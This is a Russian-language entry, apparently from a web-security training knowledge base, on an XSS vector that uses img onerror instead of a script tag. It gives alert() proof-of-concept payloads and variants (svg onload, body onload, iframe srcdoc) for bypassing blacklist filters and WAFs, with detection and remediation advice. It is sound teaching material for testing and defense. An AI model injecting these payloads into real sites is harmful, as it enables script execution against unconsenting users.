---
id: xss-img-onerror-no-script-tag
title: "XSS: вектор без тега script (img onerror)"
type: xss
target: html
category: web
difficulty: beginner
bypass: waf
tags: [xss, event-handler, waf-bypass]
tested_on: ["Chrome 120", "Safari 17"]
success_rate: 0.85
risk: medium
cwe: "CWE-79"
lab: "labs/web-labs/xss-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/xss/"
  - "https://portswigger.net/web-security/cross-site-scripting"
graph:
  - target: "xss"
    type: instance_of
  - target: "waf-bypass"
    type: technique_of
---

# XSS: вектор без тега script (img onerror)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<img src=x onerror=alert(document.domain)>
```

## Explanation

Многие наивные фильтры ищут именно `<script`. Обработчики событий (`onerror`, `onload`,
`onfocus`) исполняют JavaScript без единого тега `<script>`. `src=x` намеренно вызывает
ошибку загрузки, поэтому срабатывает `onerror`.

## Detection

Если `<script>` блокируется/вырезается, а `<img src=x onerror=...>` проходит —
фильтр blacklist-based и обходится. Проверяйте также `<svg onload>`, `<body onload>`,
`<iframe srcdoc>`.

## Remediation

- Whitelist-санитизация (DOMPurify, bleach, OWASP Java HTML Sanitizer) вместо blacklist.
- CSP без `unsafe-inline` — inline-обработчики не выполняются.
- Автоэкранирование в шаблонизаторе.

## Variants

```
<svg onload=alert(document.domain)>
```

```
<body onload=alert(1)>
```

```
<iframe srcdoc="<script>alert(1)</script>">
```
